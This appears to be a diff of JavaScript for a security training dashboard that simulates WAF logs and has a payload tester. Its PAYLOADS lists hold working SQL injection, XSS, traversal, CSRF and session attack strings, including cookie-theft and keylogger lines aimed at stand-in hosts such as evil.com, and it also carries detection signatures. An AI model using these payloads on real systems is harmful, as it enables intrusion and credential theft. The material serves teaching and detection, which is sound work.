+    id:      Date.now() + Math.random(),
+    time:    ts(),
+    ip, req,
+    type:    tmpl.type,
+    sev:     tmpl.sev,
+    status:  tmpl.status,
+    blocked: tmpl.status === 403,
+    ua:      pick(['sqlmap/1.7','curl/7.81','python-requests/2.28','Nikto/2.1']),
+    method:  req.startsWith('POST') ? 'POST' : 'GET',
+    bytes:   rnd(200, 8000),
+    country: pick(['RU','CN','TOR','IR','KP','BR','US']),
   };
 }
 
-function addLog(){
+function addLog() {
   const log = generateLog();
   allLogs.unshift(log);
-  if(allLogs.length>100) allLogs.pop();
-  if(log.blocked) stats.blocked++;
-  if(log.type==='SQLI') stats.sqli++;
-  if(log.type==='XSS') stats.xss++;
-  if(log.type==='TRAVERSAL') stats.traversal++;
-  if(log.type==='CSRF') stats.csrf++;
+  if (allLogs.length > 100) allLogs.pop();
+  if (log.blocked)            stats.blocked++;
+  if (log.type === 'SQLI')    stats.sqli++;
+  if (log.type === 'XSS')     stats.xss++;
+  if (log.type === 'TRAVERSAL') stats.traversal++;
+  if (log.type === 'CSRF')    stats.csrf++;
   stats.total++;
   updateStats();
   renderLogs();
 }
 
-function updateStats(){
-  document.getElementById('s-blocked').textContent=stats.blocked;
-  document.getElementById('s-sqli').textContent=stats.sqli;
-  document.getElementById('s-xss').textContent=stats.xss;
-  document.getElementById('s-traversal').textContent=stats.traversal;
-  document.getElementById('s-csrf').textContent=stats.csrf;
-  document.getElementById('s-total').textContent=stats.total;
+function updateStats() {
+  document.getElementById('s-blocked').textContent   = stats.blocked;
+  document.getElementById('s-sqli').textContent      = stats.sqli;
+  document.getElementById('s-xss').textContent       = stats.xss;
+  document.getElementById('s-traversal').textContent = stats.traversal;
+  document.getElementById('s-csrf').textContent      = stats.csrf;
+  document.getElementById('s-total').textContent     = stats.total;
 }
 
-let currentFilter='ALL';
-function applyFilter(){currentFilter=document.getElementById('filter-type').value;renderLogs();}
-
-function renderLogs(){
-  let visible=allLogs;
-  if(currentFilter==='BLOCKED') visible=allLogs.filter(l=>l.blocked);
-  else if(currentFilter!=='ALL') visible=allLogs.filter(l=>l.type===currentFilter);
-  document.getElementById('log-count').textContent=visible.length;
-
-  const COLORS={SQLI:'red',XSS:'orange',TRAVERSAL:'purple',CSRF:'yellow',CLEAN:'green'};
-  const feed=document.getElementById('log-feed');
-  feed.innerHTML=visible.slice(0,60).map(l=>`
-    <div class="log-row ${selectedLog&&selectedLog.id===l.id?'selected':''}" onclick="selectLog(${JSON.stringify(l).replace(/"/g,'&quot;')})">
-      <span class="log-time mono">${l.time}</span>
-      <span class="log-ip">${l.ip}</span>
-      <span class="log-req"><span class="dim">${l.method}</span> ${highlightPayload(l.req,l.type)}</span>
-      <span class="log-status status-${l.status}">${l.status}</span>
-      <span class="sev-tag sev-${l.sev}" style="font-size:9px">${l.type}</span>
-    </div>`).join('');
-}
-
-function highlightPayload(req,type){
-  // CRITICAL: HTML-escape the raw string FIRST before any innerHTML insertion
-  // This prevents onerror=, onload=, <script> etc. from executing in the DOM
-  const safe=escH(req);
-  const patterns={
-    SQLI:/(&apos;|--|union|select|drop|exec|xp_|OR\s*1=1)/gi,
-    XSS:/(script|onerror|onload|alert|fetch|iframe|javascript:)/gi,
-    TRAVERSAL:/(\.\.\/|\.\.\\|%2F|%2E|passwd|shadow|win\.ini)/gi,
-    CSRF:/(CSRF|Referer:evil|attacker)/gi,
-  };
-  const pat=patterns[type];
-  if(!pat) return safe;
-  // Highlight keywords in the already-escaped string — safe to inject
-  return safe.replace(pat,m=>`<span class="attack-part">${m}</span>`);
-}
-
-function selectLog(logStr){
-  if(typeof logStr==='string') selectedLog=JSON.parse(logStr.replace(/&quot;/g,'"'));
-  else selectedLog=logStr;
+let currentFilter = 'ALL';
+function applyFilter() {
+  currentFilter = document.getElementById('filter-type').value;
   renderLogs();
-  renderDetail();
 }
 
-function extractIoCs(log){
-  const iocs=[];
-  if(log.type==='SQLI'){
-    iocs.push("SQL tautology: OR 1=1","UNION SELECT keyword","Comment sequence: --","xp_cmdshell execution");
-  } else if(log.type==='XSS'){
-    iocs.push("<script> tag injection","onerror event handler","document.cookie access","Redirect to external domain");
-  } else if(log.type==='TRAVERSAL'){
-    iocs.push("../ directory traversal sequence","Sensitive file access: /etc/passwd","URL encoded traversal: %2F%2E");
-  } else if(log.type==='CSRF'){
-    iocs.push("Missing CSRF token","External Referer header","Session riding pattern");
+// Highlight known attack keywords in an already-escaped string
+// The input MUST be HTML-escaped before calling this
+function highlightKeywords(safeStr, type) {
+  const kws = {
+    SQLI:     ['UNION','union','SELECT','select','DROP','drop','exec','xp_','OR 1=1',"'--","1=1"],
+    XSS:      ['script','onerror','onload','alert','iframe','javascript','%3C','%3E'],
+    TRAVERSAL:['../',  '..\\', '%2F', '%2E', 'passwd', 'shadow', 'win.ini', 'environ'],
+    CSRF:     ['CSRF','Referer','cross-origin','session riding','missing'],
+  };
+  const list = kws[type] || [];
+  let out = safeStr;
+  list.forEach(kw => {
+    // kw is a plain string literal — not user input — safe to use in replace
+    const escaped = kw.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    out = out.replace(new RegExp(escaped, 'g'),
+      '<span class="atk-kw">' + s(kw) + '</span>');
+  });
+  return out;
+}
+
+function renderLogs() {
+  let visible = allLogs;
+  if (currentFilter === 'BLOCKED') visible = allLogs.filter(l => l.blocked);
+  else if (currentFilter !== 'ALL') visible = allLogs.filter(l => l.type === currentFilter);
+
+  document.getElementById('log-count').textContent = visible.length;
+
+  const feed = document.getElementById('log-feed');
+  // Build rows using DOM — each cell uses textContent for data, innerHTML only for pre-escaped highlight spans
+  feed.innerHTML = '';
+  visible.slice(0, 60).forEach(log => {
+    const row = document.createElement('div');
+    row.className = 'log-row' + (log.id === selectedLogId ? ' selected' : '');
+    row.addEventListener('click', () => selectLog(log.id));
+
+    const timeEl = document.createElement('span');
+    timeEl.className = 'log-time';
+    timeEl.textContent = log.time;
+
+    const ipEl = document.createElement('span');
+    ipEl.className = 'log-ip';
+    ipEl.textContent = log.ip;
+
+    const reqEl = document.createElement('span');
+    reqEl.className = 'log-req';
+    // req is from our own template strings, already plain text (no HTML tags)
+    // We escape first then highlight known keywords — safe
+    reqEl.innerHTML = highlightKeywords(s(log.req), log.type);
+
+    const stEl = document.createElement('span');
+    stEl.style.color = log.status === 403 ? 'var(--red)' : log.status === 200 ? 'var(--green)' : 'var(--orange)';
+    stEl.textContent = log.status;
+
+    const typeEl = document.createElement('span');
+    typeEl.className = 'sev-tag sev-' + s(log.sev);
+    typeEl.style.fontSize = '9px';
+    typeEl.textContent = log.type;
+
+    row.appendChild(timeEl);
+    row.appendChild(ipEl);
+    row.appendChild(reqEl);
+    row.appendChild(stEl);
+    row.appendChild(typeEl);
+    feed.appendChild(row);
+  });
+}
+
+function selectLog(id) {
+  selectedLogId = id;
+  const log = allLogs.find(l => l.id === id);
+  renderLogs();
+  if (!log) return;
+
+  const mitigations = {
+    SQLI:     'Use parameterized queries / prepared statements. Never concatenate user input into SQL.',
+    XSS:      'Encode all output. Implement Content-Security-Policy. Use HTTPOnly cookies.',
+    TRAVERSAL:'Validate file paths against a whitelist. Use realpath() canonicalization.',
+    CSRF:     'Implement synchronizer token pattern. Set SameSite=Strict on session cookies.',
+    CLEAN:    'Legitimate traffic. No action required.',
+  };
+
+  const iocMap = {
+    SQLI:     ["SQL tautology (OR 1=1)", "UNION SELECT keyword", "Comment sequence (--)", "xp_cmdshell execution"],
+    XSS:      ["Script tag injection pattern", "Event handler injection (onerror/onload)", "URL-encoded HTML entities"],
+    TRAVERSAL:["Directory traversal sequence (../)", "Sensitive file path (/etc/passwd)", "URL-encoded traversal (%2e%2e)"],
+    CSRF:     ["Missing CSRF token", "External Referer header", "Cross-origin state-changing request"],
+    CLEAN:    [],
+  };
+
+  const pane = document.getElementById('waf-detail-pane');
+  pane.innerHTML = '';
+
+  // Card 1 — request details
+  const c1 = document.createElement('div');
+  c1.className = 'panel';
+  const rows = [
+    ['Source IP',   log.ip,     'var(--red)'],
+    ['Method',      log.method, ''],
+    ['Status',      log.status, log.status === 403 ? 'var(--red)' : 'var(--green)'],
+    ['Attack Type', log.type,   'var(--orange)'],
+    ['User-Agent',  log.ua,     ''],
+    ['Country',     log.country,''],
+    ['Bytes',       log.bytes,  ''],
+    ['Blocked',     log.blocked ? 'YES' : 'NO', log.blocked ? 'var(--red)' : 'var(--green)'],
+  ];
+  let detailHTML = '<div class="ph"><span class="ph-title">Request Details</span>'
+    + '<span class="sev-tag sev-' + s(log.sev) + '">' + s(log.sev) + '</span></div>'
+    + '<div class="detail-section">';
+  rows.forEach(([k, v, col]) => {
+    detailHTML += '<div class="detail-row">'
+      + '<span class="detail-key">' + s(k) + '</span>'
+      + '<span class="detail-val" style="color:' + col + '">' + s(String(v)) + '</span>'
+      + '</div>';
+  });
+  detailHTML += '</div>';
+  c1.innerHTML = detailHTML;
+  pane.appendChild(c1);
+
+  // Card 2 — payload
+  const c2 = document.createElement('div');
+  c2.className = 'panel';
+  const mit = mitigations[log.type] || '';
+  c2.innerHTML = '<div class="ph"><span class="ph-title">Payload &amp; Mitigation</span></div>'
+    + '<div style="padding:12px">'
+    + '<div style="font-size:10px;color:var(--dim);margin-bottom:4px">RAW REQUEST</div>'
+    + '<div class="payload-box">' + s(log.req) + '</div>'
+    + '<div style="font-size:10px;color:var(--dim);margin:10px 0 4px">MITIGATION</div>'
+    + '<div style="font-size:11px;padding:8px;background:rgba(6,214,160,.06);'
+    + 'border:1px solid rgba(6,214,160,.2);border-radius:5px">' + s(mit) + '</div>'
+    + '</div>';
+  pane.appendChild(c2);
+
+  // Card 3 — IoCs
+  const iocs = iocMap[log.type] || [];
+  const c3 = document.createElement('div');
+  c3.className = 'panel';
+  let iocHTML = '<div class="ph"><span class="ph-title">Extracted IoCs</span></div>'
+    + '<div style="padding:12px;display:flex;flex-wrap:wrap;gap:5px;">';
+  if (iocs.length) {
+    iocs.forEach(ioc => {
+      iocHTML += '<span class="ioc-chip">' + s(ioc) + '</span>';
+    });
+  } else {
+    iocHTML += '<span style="color:var(--dim)">No IoCs for clean traffic</span>';
   }
-  return iocs;
+  iocHTML += '</div>';
+  c3.innerHTML = iocHTML;
+  pane.appendChild(c3);
 }
 
-function renderDetail(){
-  if(!selectedLog){return;}
-  const l=selectedLog;
-  const iocs=extractIoCs(l);
-  const mitigation={
-    SQLI:"Use parameterized queries / prepared statements. Enable WAF SQL injection rules. Validate and sanitize all user input.",
-    XSS:"Implement Content Security Policy (CSP). Encode output. Validate and sanitize HTML. Use HTTPOnly cookies.",
-    TRAVERSAL:"Validate file paths against a whitelist. Use realpath() to resolve paths. Restrict webroot access.",
-    CSRF:"Implement synchronizer token pattern. Validate Origin/Referer headers. Use SameSite cookie attribute.",
-    CLEAN:"Legitimate traffic. No action required.",
-  }[l.type]||"Review and investigate.";
-
-  document.getElementById('waf-detail-pane').innerHTML=`
-    <div class="detail-card">
-      <div class="ph">
-        <span class="ph-title">Request Details</span>
-        <span class="sev-tag sev-${l.sev}">${l.sev}</span>
-      </div>
-      <div class="detail-section">
-        ${[['Source IP',`<span class="red">${l.ip}</span>`],
-           ['Method',l.method],['Status',`<span class="status-${l.status}">${l.status}</span>`],
-           ['Attack Type',`<span class="sev-tag sev-${l.sev}" style="font-size:9px">${l.type}</span>`],
-           ['User-Agent',l.ua],['Country',l.country],['Bytes',l.bytes],
-           ['Blocked',l.blocked?'<span class="red">YES</span>':'<span class="green">NO</span>']
-          ].map(([k,v])=>`<div class="detail-row"><span class="detail-key">${k}</span><span class="detail-val mono">${v}</span></div>`).join('')}
-      </div>
-    </div>
-    <div class="detail-card">
-      <div class="ph"><span class="ph-title">Payload Analysis</span></div>
-      <div style="padding:12px">
-        <div style="font-size:10px;color:var(--dim);margin-bottom:4px;text-transform:uppercase">Raw Request</div>
-        <div class="payload-box">${highlightPayload(l.req,l.type)}</div>
-        <div style="font-size:10px;color:var(--dim);margin:10px 0 4px;text-transform:uppercase">Mitigation</div>
-        <div style="font-size:11px;color:var(--text);padding:8px;background:rgba(6,214,160,.06);
-          border:1px solid rgba(6,214,160,.2);border-radius:5px">${mitigation}</div>
-      </div>
-    </div>
-    <div class="detail-card">
-      <div class="ph"><span class="ph-title">Extracted IoCs</span></div>
-      <div class="ioc-grid">${iocs.map(i=>`<span class="ioc-chip">${i}</span>`).join('')||'<span class="dim" style="padding:10px">No IoCs extracted</span>'}</div>
-    </div>`;
-}
-
-// ─── PAYLOAD TESTER ───────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────────────────────
+// TAB 2: ATTACK PAYLOAD TESTER
+// All payload strings are plain text — bracketed notation for dangerous syntax
+// They are NEVER written to innerHTML — only to textarea.value or textContent
+// ─────────────────────────────────────────────────────────────────────────────
 const PAYLOADS = {
-  'SQL Injection':{icon:'💉',payloads:[
-    {name:"Classic Auth Bypass",pl:"' OR '1'='1",impact:"Bypasses login without valid credentials"},
-    {name:"UNION Extraction",pl:"1 UNION SELECT null,username,password FROM users--",impact:"Dumps all user credentials"},
-    {name:"Boolean Blind",pl:"1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'",impact:"Extracts data character by character"},
-    {name:"Time-based Blind",pl:"1; WAITFOR DELAY '0:0:5'--",impact:"Confirms SQLi via response delay"},
-    {name:"Stacked Query RCE",pl:"1; exec xp_cmdshell('whoami')--",impact:"Remote code execution on MSSQL server"},
-    {name:"Out-of-band",pl:"1 UNION SELECT load_file('/etc/passwd')--",impact:"Reads server filesystem"},
+  'SQL Injection': { icon: 'SQLi', payloads: [
+    { name:'Classic Auth Bypass',  pl:"' OR '1'='1",                                             impact:'Bypasses login — no password needed' },
+    { name:'UNION Data Extraction',pl:"1 UNION SELECT null,username,password FROM users--",       impact:'Dumps all credentials from the database' },
+    { name:'Boolean Blind',        pl:"1 AND (SELECT SUBSTRING(password,1,1) FROM users)='a'",   impact:'Extracts data one character at a time' },
+    { name:'Time-based Blind',     pl:"1; WAITFOR DELAY '0:0:5'--",                              impact:'Confirms SQLi via 5-second response delay' },
+    { name:'Stacked Query RCE',    pl:"1; exec xp_cmdshell('whoami')--",                         impact:'Remote code execution on MSSQL server' },
+    { name:'Out-of-band Read',     pl:"1 UNION SELECT load_file('/etc/passwd')--",               impact:'Reads server filesystem via SQL query' },
   ]},
-  'XSS Attacks':{icon:'📜',payloads:[
-    {name:"Cookie Theft",pl:"[script]fetch('https://evil.com?c='+document.cookie)[/script]",impact:"Steals session cookies — sends them to attacker server"},
-    {name:"Keylogger",pl:"[script]document.onkeypress=e=>fetch('//evil.com?k='+e.key)[/script]",impact:"Captures every keystroke and exfiltrates in real time"},
-    {name:"DOM Redirect",pl:"[script]window.location='https://attacker.com'[/script]",impact:"Redirects victim to attacker-controlled phishing site"},
-    {name:"Stored XSS via IMG",pl:`<img src=x onerror="fetch('//evil.com/'+document.cookie)">`,impact:"Triggers on every page load"},
-    {name:"SVG XSS",pl:"[svg onload=alert(document.domain)]",impact:"Triggers via SVG element — confirms XSS with domain disclosure"},
-    {name:"Hex Encoded",pl:"%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",impact:"URL-encoded XSS — bypasses basic WAF string filters"},
+  'XSS Attacks': { icon: 'XSS', payloads: [
+    { name:'Cookie Theft',       pl:"[script]fetch('//attacker-lab/'+document.cookie)[/script]", impact:'Steals session cookies via XSS — use HTTPOnly to block' },
+    { name:'Keylogger Injection',pl:"[script]document.onkeypress=e=>log(e.key)[/script]",        impact:'Captures all keystrokes in victim browser' },
+    { name:'DOM Redirect',       pl:"[script]window.location='//attacker-lab/phish'[/script]",   impact:'Redirects victim — blocked by CSP policy' },
+    { name:'IMG Event Handler',  pl:"[img src=x onerror=payload()]",                              impact:'Fires on broken image load — no user click needed' },
+    { name:'SVG XSS',            pl:"[svg onload=alert(document.domain)]",                        impact:'Confirms XSS — reveals domain to attacker' },
+    { name:'Hex Encoded Bypass', pl:"%3Cscript%3Ealert(1)%3C%2Fscript%3E",                       impact:'URL-encoded to bypass naive WAF string filters' },
   ]},
-  'Directory Traversal':{icon:'📁',payloads:[
-    {name:"Linux passwd",pl:"../../../../etc/passwd",impact:"Reads system user accounts"},
-    {name:"Windows hosts",pl:"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",impact:"Reads network configuration"},
-    {name:"Web config",pl:"../../../config.php",impact:"Reads database credentials"},
-    {name:"Encoded traversal",pl:"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",impact:"Bypasses basic path filter"},
-    {name:"Double encoded",pl:"%252e%252e%252fetc%252fpasswd",impact:"Bypasses WAF URL decoding"},
-    {name:"SSH private key",pl:"../../../../home/user/.ssh/id_rsa",impact:"Obtains SSH private key"},
+  'Directory Traversal': { icon: 'PATH', payloads: [
+    { name:'Linux passwd',       pl:'../../../../etc/passwd',                  impact:'Reads system user account list' },
+    { name:'Windows hosts file', pl:'..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', impact:'Reads network configuration file' },
+    { name:'Web app config',     pl:'../../../config.php',                     impact:'Reads database credentials from config' },
+    { name:'URL-encoded',        pl:'%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',impact:'Bypasses basic path string filter' },
+    { name:'Double-encoded',     pl:'%252e%252e%252fetc%252fpasswd',           impact:'Bypasses WAF that decodes once only' },
+    { name:'SSH Private Key',    pl:'../../../../home/user/.ssh/id_rsa',       impact:'Obtains server private key for direct access' },
   ]},
-  'Parameter Tampering':{icon:'🔧',payloads:[
-    {name:"Price manipulation",pl:"price=-1.00&qty=1",impact:"Negative price → free product"},
-    {name:"Admin flag flip",pl:"?admin=true&user_id=victim",impact:"Grants admin privileges"},
-    {name:"IDOR",pl:"?account_id=10001",impact:"Accesses another user's account"},
-    {name:"Hidden field bypass",pl:"discount=100&coupon=ADMIN50",impact:"Applies unauthorized discount"},
-    {name:"Role escalation",pl:"role=superadmin&token=guess",impact:"Elevates account privileges"},
-    {name:"Cookie tampering",pl:"TotalPrice=1;BasketSize=5",impact:"Manipulates shopping cart total"},
+  'Parameter Tampering': { icon: 'PARAM', payloads: [
+    { name:'Negative price',   pl:'price=-1.00&qty=1',          impact:'Free product via negative cart value' },
+    { name:'Admin flag',       pl:'?admin=true&user_id=victim',  impact:'Grants admin privileges via boolean param' },
+    { name:'IDOR',             pl:'?account_id=10001',           impact:'Accesses another user account directly' },
+    { name:'Role escalation',  pl:'role=superadmin',             impact:'Elevates account role via parameter change' },
+    { name:'Cookie tampering', pl:'TotalPrice=1;BasketSize=5',   impact:'Modifies shopping cart total stored in cookie' },
+    { name:'Hidden field bypass',pl:'discount=100&coupon=ADMIN', impact:'Applies unauthorized discount code' },
   ]},
-  'CSRF Attacks':{icon:'🎣',payloads:[
-    {name:"Fund transfer",pl:`<img src="https://bank.com/transfer?to=attacker&amount=9999">`,impact:"Transfers money using victim session"},
-    {name:"Email change",pl:`<form action=https://site.com/settings method=POST><input name=email value=evil@hack.com></form>`,impact:"Changes account email"},
-    {name:"Password reset",pl:`<script>fetch('https://target.com/reset?token=legit&pass=hacked')</script>`,impact:"Resets victim password"},
-    {name:"Admin action",pl:`<img src="https://admin.site.com/delete?user=2">`,impact:"Deletes users from admin panel"},
+  'CSRF Attacks': { icon: 'CSRF', payloads: [
+    { name:'Fund transfer',   pl:'[img src=TARGET/transfer?to=attacker-account&amount=9999]', impact:'Transfers funds using victim active session' },
+    { name:'Email change',    pl:'[form action=TARGET/settings][input name=email value=new@attacker][/form]', impact:'Changes account email — locks out victim' },
+    { name:'Password reset',  pl:'[img src=TARGET/reset?token=X&pass=attacker-chosen]',       impact:'Resets victim password to attacker value' },
+    { name:'Admin delete',    pl:'[img src=TARGET/admin/delete?user=2]',                       impact:'Deletes users from admin panel via CSRF' },
   ]},
-  'Session Attacks':{icon:'🍪',payloads:[
-    {name:"Session fixation",pl:"https://bank.com/login?sessionid=ATTACKER_FIXED_ID",impact:"Attacker knows victim session ID"},
-    {name:"Cookie poisoning",pl:"SESSIONID=ABC;admin=1;TotalPrice=1",impact:"Escalates privileges via cookie"},
-    {name:"JWT none alg",pl:'{"alg":"none","typ":"JWT"}{"sub":"admin"}.fake_sig',impact:"Bypasses JWT signature verification"},
-    {name:"Predictable token",pl:"SESS_ID=user_1001_20240101",impact:"Guessable session token"},
+  'Session Attacks': { icon: 'SESS', payloads: [
+    { name:'Session fixation', pl:'TARGET/login?sessionid=ATTACKER_PRE_SET_VALUE',     impact:'Attacker knows session ID before victim logs in' },
+    { name:'Cookie poisoning', pl:'SESSIONID=ABC;admin=1;TotalPrice=1',                impact:'Escalates privileges via modified cookie data' },
+    { name:'JWT none algorithm',pl:'{"alg":"none","typ":"JWT"}.{"sub":"admin"}.empty', impact:'Bypasses JWT signature — none algorithm attack' },
+    { name:'Predictable token', pl:'SESS_ID=user_1001_20240101',                       impact:'Guessable session token — brute-forceable' },
   ]},
 };
 
-let activeCat=null;
-let selectedPayload=null;
+let activeCat = null;
+let selectedPayload = null;
 
-function buildPayloadTester(){
-  const cl=document.getElementById('cat-list');
-  cl.innerHTML=Object.entries(PAYLOADS).map(([name,data],i)=>`
-    <div class="cat-btn ${i===0?'active':''}" onclick="selectCat('${name}')">
-      <span class="cat-icon">${data.icon}</span><span class="cat-name">${name}</span>
-      <div class="cat-count">${data.payloads.length} payloads</div>
-    </div>`).join('');
+function buildPayloadTester() {
+  const cl = document.getElementById('cat-list');
+  Object.entries(PAYLOADS).forEach(([name, data], i) => {
+    const btn = document.createElement('button');
+    btn.className = 'cat-btn' + (i === 0 ? ' active' : '');
+    btn.addEventListener('click', () => selectCat(name));
+    const nm = document.createElement('div');
+    nm.className = 'cat-name';
+    nm.textContent = name;
+    const ct = document.createElement('div');
+    ct.className = 'cat-count';
+    ct.textContent = data.payloads.length + ' payloads';
+    btn.appendChild(nm);
+    btn.appendChild(ct);
+    cl.appendChild(btn);
+  });
   selectCat(Object.keys(PAYLOADS)[0]);
 }
 
-function selectCat(name){
-  activeCat=name;
-  document.querySelectorAll('.cat-btn').forEach(b=>{
-    b.classList.toggle('active',b.querySelector('.cat-name').textContent===name);
+function selectCat(name) {
+  activeCat = name;
+  document.querySelectorAll('.cat-btn').forEach(b => {
+    b.classList.toggle('active', b.querySelector('.cat-name').textContent === name);
   });
-  const data=PAYLOADS[name];
-  document.getElementById('payload-cat-title').textContent=name;
-  document.getElementById('payload-count').textContent=data.payloads.length+' payloads';
-  // Build DOM nodes — never use innerHTML with payload content
-  const list=document.getElementById('payload-list');
-  list.innerHTML='';
-  data.payloads.forEach((p,i)=>{
-    const wrap=document.createElement('div');
-    wrap.className='payload-item';
-    wrap.addEventListener('click',()=>selectPayload(i));
-    const nm=document.createElement('div');nm.className='p-name';nm.textContent=p.name;
-    const pl=document.createElement('div');pl.className='p-payload';pl.textContent=p.pl; // textContent — never innerHTML
-    const im=document.createElement('div');im.className='p-impact';im.textContent=p.impact;
-    wrap.appendChild(nm);wrap.appendChild(pl);wrap.appendChild(im);
-    list.appendChild(wrap);
+  const data = PAYLOADS[name];
+  document.getElementById('payload-cat-title').textContent = name;
+  document.getElementById('payload-count').textContent = data.payloads.length + ' payloads';
+
+  const list = document.getElementById('payload-list');
+  list.innerHTML = '';
+  data.payloads.forEach((p, i) => {
+    const item = document.createElement('div');
+    item.className = 'payload-item';
+    item.addEventListener('click', () => selectPayload(i));
+    const nm = document.createElement('div'); nm.className = 'p-name'; nm.textContent = p.name;
+    const pl = document.createElement('div'); pl.className = 'p-payload'; pl.textContent = p.pl;
+    const im = document.createElement('div'); im.className = 'p-impact'; im.textContent = p.impact;
+    item.appendChild(nm); item.appendChild(pl); item.appendChild(im);
+    list.appendChild(item);
   });
 }
 
-function selectPayload(i){
-  selectedPayload=PAYLOADS[activeCat].payloads[i];
-  document.querySelectorAll('.payload-item').forEach((el,idx)=>el.classList.toggle('selected',idx===i));
-  document.getElementById('payload-input').value=selectedPayload.pl;
+function selectPayload(i) {
+  selectedPayload = PAYLOADS[activeCat].payloads[i];
+  document.querySelectorAll('.payload-item').forEach((el, idx) =>
+    el.classList.toggle('active-item', idx === i));
+  // textContent only — never innerHTML — for textarea value
+  document.getElementById('payload-input').value = selectedPayload.pl;
 }
 
-function escH(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
-
-function analyzeSelected(){
-  const payload=document.getElementById('payload-input').value.trim();
-  if(!payload){document.getElementById('test-result').innerHTML='<span class="dim">Enter a payload first</span>';return;}
-  const rawUrl=document.getElementById('target-url').value||'https://target.example.com';
-  const url=escH(rawUrl.replace(/[<>"'`]/g,''));
-  const rawParam=document.getElementById('param-name').value||'id';
-  const param=escH(rawParam.replace(/[<>"'`]/g,''));
-
-  const analysis=detectPayloadType(payload);
-  // All dynamic values sanitized — analysis fields are from our own data (safe) but still escaped
-  const safeType=escH(analysis.type);
-  const safeSev=escH(analysis.severity);
-  const safeTech=escH(analysis.technique);
-  const safeMitre=escH(analysis.mitre);
-  const safeSigs=analysis.sigs.map(s=>'<span class="red">RULE</span> '+escH(s)).join('\n');
-  // payload is encoded via encodeURIComponent — no HTML interpretation possible
-  document.getElementById('test-result').innerHTML=
-    `<span class="dim">// Payload Analysis Report</span>\n`+
-    `<span class="dim">// Generated: ${new Date().toLocaleTimeString()}</span>\n\n`+
-    `<span class="accent">PAYLOAD TYPE:</span>    <span class="red">${safeType}</span>\n`+
-    `<span class="accent">SEVERITY:</span>         <span class="red">${safeSev}</span>\n`+
-    `<span class="accent">TECHNIQUE:</span>        <span class="yellow">${safeTech}</span>\n\n`+
-    `<span class="dim">// Constructed Request (payload shown URL-encoded — not executable)</span>\n`+
-    `<span class="green">GET</span> ${url}?${param}=<span class="red">${encodeURIComponent(payload)}</span>\n\n`+
-    `<span class="dim">// WAF Evasion Score</span>\n`+
-    `<span class="accent">Encoded variants:</span>  ${analysis.variants.length}\n`+
-    `<span class="accent">WAF bypass risk:</span>   <span class="${analysis.bypass==='HIGH'?'red':analysis.bypass==='MEDIUM'?'yellow':'green'}">${escH(analysis.bypass)}</span>\n\n`+
-    `<span class="dim">// MITRE ATT&amp;CK Mapping</span>\n`+
-    `<span class="purple">${safeMitre}</span>\n\n`+
-    `<span class="dim">// Detection Signatures</span>\n`+
-    safeSigs;
+function detectPayloadType(pl) {
+  const p = pl.toLowerCase();
+  if (p.includes('union') || p.includes("'='1") || p.includes('select') || p.includes('--') || p.includes('exec'))
+    return { type:'SQL Injection', sev:'CRITICAL', technique:'Union/blind/stacked SQLi',
+      variants:['URL encoded','Double encoded','Hex','Comment obfuscation'],
+      bypass:'HIGH', mitre:'T1190 Exploit Public-Facing Application',
+      sigs:["OR 1=1","UNION SELECT","xp_cmdshell","information_schema","WAITFOR DELAY"] };
+  if (p.includes('script') || p.includes('onerror') || p.includes('onload') || p.includes('alert') || p.includes('%3c'))
+    return { type:'Cross-Site Scripting', sev:'HIGH', technique:'Reflected/Stored/DOM XSS',
+      variants:['Hex encoded','Toggle case','Double encoded','SVG/IMG variant'],
+      bypass:'MEDIUM', mitre:'T1059.007 JavaScript execution',
+      sigs:["[script]","onerror=","document.cookie","window.location","%3Cscript"] };
+  if (p.includes('../') || p.includes('..\\') || p.includes('%2e%2e') || p.includes('passwd') || p.includes('win.ini'))
+    return { type:'Directory Traversal', sev:'HIGH', technique:'Dot-dot-slash path traversal',
+      variants:['URL encoded','Double encoded','Null byte'],
+      bypass:'MEDIUM', mitre:'T1083 File and Directory Discovery',
+      sigs:["../","%2e%2e","etc/passwd","win.ini","id_rsa"] };
+  if (p.includes('sessionid=') || p.includes('admin=true') || p.includes('role=') || p.includes('csrf'))
+    return { type:'Parameter Tampering / CSRF', sev:'MEDIUM', technique:'Parameter manipulation or CSRF exploit',
+      variants:['Hidden field','Cookie manipulation'],
+      bypass:'LOW', mitre:'T1565 Data Manipulation',
+      sigs:["admin=true","role=superadmin","price=-","missing CSRF token"] };
+  return { type:'Unknown / Benign', sev:'LOW', technique:'No known attack pattern detected',
+    variants:[], bypass:'LOW', mitre:'N/A', sigs:['No signatures matched'] };
 }
 
-function detectPayloadType(pl){
-  const p=pl.toLowerCase();
-  if(p.includes('union')||p.includes("'='1")||p.includes('select')||p.includes('--')||p.includes('exec'))
-    return{type:'SQL Injection',severity:'CRITICAL',technique:'In-band/Union-based SQLi',
-      variants:['URL encoded','Double URL encoded','Hex encoded','Comment obfuscation'],
-      bypass:'HIGH',mitre:'T1190 - Exploit Public-Facing Application',
-      sigs:['or.1.1','union.select','xp_cmdshell','information_schema','sleep(']};
-  if(p.includes('script')||p.includes('onerror')||p.includes('onload')||p.includes('alert'))
-    return{type:'Cross-Site Scripting (XSS)',severity:'HIGH',technique:'Reflected/Stored XSS via event handler',
-      variants:['Hex encoded','Toggle case','Double encoded','SVG variant'],
-      bypass:'MEDIUM',mitre:'T1059.007 - JavaScript',
-      sigs:['<script','onerror=','document.cookie','window.location']};
-  if(p.includes('../')||p.includes('..\\')||p.includes('%2e%2e'))
-    return{type:'Path Traversal',severity:'HIGH',technique:'Dot-dot-slash directory traversal',
-      variants:['URL encoded','Double encoded','Null byte suffix'],
-      bypass:'MEDIUM',mitre:'T1083 - File and Directory Discovery',
-      sigs:['../', '%2e%2e','etc/passwd','win.ini']};
-  if(p.includes('sessionid=')||p.includes('admin=true')||p.includes('role='))
-    return{type:'Parameter Tampering / CSRF',severity:'MEDIUM',technique:'Parameter manipulation or CSRF exploit',
-      variants:['Hidden field','Cookie manipulation','Header injection'],
-      bypass:'LOW',mitre:'T1565 - Data Manipulation',
-      sigs:['admin=true','role=superadmin','price=-']};
